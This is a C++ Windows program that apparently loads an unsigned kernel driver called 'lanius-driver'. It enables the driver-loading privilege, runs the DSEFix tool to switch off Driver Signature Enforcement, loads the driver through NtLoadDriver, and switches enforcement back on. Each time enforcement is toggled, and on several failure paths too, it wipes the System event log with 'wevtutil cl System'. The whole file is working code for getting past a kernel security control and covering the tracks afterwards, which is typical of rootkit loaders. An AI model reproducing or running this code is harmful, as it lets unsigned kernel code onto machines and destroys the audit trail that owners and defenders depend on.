#include <windows.h>
#include <subauth.h>
#include <iostream>

typedef NTSTATUS(NTAPI *NtLoadDriverFn)(IN PUNICODE_STRING);
typedef NTSTATUS(NTAPI *NtUnloadDriverFn)(IN PUNICODE_STRING);

static const char *kDsefixDir = "D:\\lanius\\DSEFix-master\\Compiled", *kDsefixFilename = "dsefix.exe";

int ClearLogs() {
	SHELLEXECUTEINFO exec_info;
	exec_info.cbSize = sizeof(SHELLEXECUTEINFO);
	exec_info.fMask = SEE_MASK_NOASYNC | SEE_MASK_NOCLOSEPROCESS;
	exec_info.hwnd = NULL;
	exec_info.lpVerb = TEXT("runas");
	exec_info.lpFile = "wevtutil";
	exec_info.lpParameters = "cl System";
	exec_info.lpDirectory = "C:\\WINDOWS\\system32";
	exec_info.nShow = SW_SHOWDEFAULT;
	if (!ShellExecuteEx(&exec_info)) {
		return GetLastError();
	}
	WaitForSingleObject(exec_info.hProcess, INFINITE);
	CloseHandle(exec_info.hProcess);
	return 0;
}
int DisableDse() {
	SHELLEXECUTEINFO exec_info;
	exec_info.cbSize = sizeof(SHELLEXECUTEINFO);
	exec_info.fMask = SEE_MASK_NOASYNC | SEE_MASK_NOCLOSEPROCESS;
	exec_info.hwnd = NULL;
	exec_info.lpVerb = TEXT("runas");
	exec_info.lpFile = kDsefixFilename;
	exec_info.lpParameters = NULL;
	exec_info.lpDirectory = kDsefixDir;
	exec_info.nShow = SW_SHOWDEFAULT;
	if (!ShellExecuteEx(&exec_info)) {
		ClearLogs();
		return GetLastError();
	}
	WaitForSingleObject(exec_info.hProcess, INFINITE);
	CloseHandle(exec_info.hProcess);
	return 0;
}
int EnableDse() {
	SHELLEXECUTEINFO exec_info;
	exec_info.cbSize = sizeof(SHELLEXECUTEINFO);
	exec_info.fMask = SEE_MASK_NOASYNC | SEE_MASK_NOCLOSEPROCESS;
	exec_info.hwnd = NULL;
	exec_info.lpVerb = TEXT("runas");
	exec_info.lpFile = kDsefixFilename;
	exec_info.lpParameters = "-e";
	exec_info.lpDirectory = kDsefixDir;
	exec_info.nShow = SW_SHOWDEFAULT;
	if (!ShellExecuteEx(&exec_info)) {
		ClearLogs();
		return GetLastError();
	}
	WaitForSingleObject(exec_info.hProcess, INFINITE);
	CloseHandle(exec_info.hProcess);
	return ClearLogs();
}
BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}
int main() {
	HMODULE ntdll = GetModuleHandle("ntdll.dll");
	if (!ntdll) {
		return -5;
	}
	NtLoadDriverFn load_driver = reinterpret_cast<NtLoadDriverFn>(GetProcAddress(ntdll, "NtLoadDriver"));
	NtLoadDriverFn unload_driver = reinterpret_cast<NtLoadDriverFn>(GetProcAddress(ntdll, "NtUnloadDriver"));
	if (!load_driver || !unload_driver) {
		return -6;
	}
	HANDLE token_handle;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token_handle)) {
		return GetLastError();
	}
	if (!SetPrivilege(token_handle, SE_LOAD_DRIVER_NAME, TRUE)) {
		return GetLastError();
	}
	wchar_t driver_reg_buf[] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\lanius-driver";
	UNICODE_STRING driver_reg_unicode;
	driver_reg_unicode.Length = sizeof(driver_reg_buf) - sizeof(wchar_t);
	driver_reg_unicode.MaximumLength = 1024;
	driver_reg_unicode.Buffer = driver_reg_buf;
	if (DisableDse()) {
		CloseHandle(token_handle);
		return -4;
	}
	NTSTATUS status = load_driver(&driver_reg_unicode);
	if (status != STATUS_SUCCESS) {
		EnableDse();
		CloseHandle(token_handle);
		return status;
	}
	if (EnableDse()) {
		CloseHandle(token_handle);
		return GetLastError();
	}
	std::cout << "The driver has been started successfully. Press any key to stop it." << std::endl;
	getchar();
	driver_reg_unicode.Length = sizeof(driver_reg_buf) - sizeof(wchar_t);
	driver_reg_unicode.MaximumLength = 1024;
	driver_reg_unicode.Buffer = driver_reg_buf;
	status = unload_driver(&driver_reg_unicode);
	if (status != STATUS_SUCCESS) {
		EnableDse();
		CloseHandle(token_handle);
		return status;
	}
	CloseHandle(token_handle);
	return 0;
}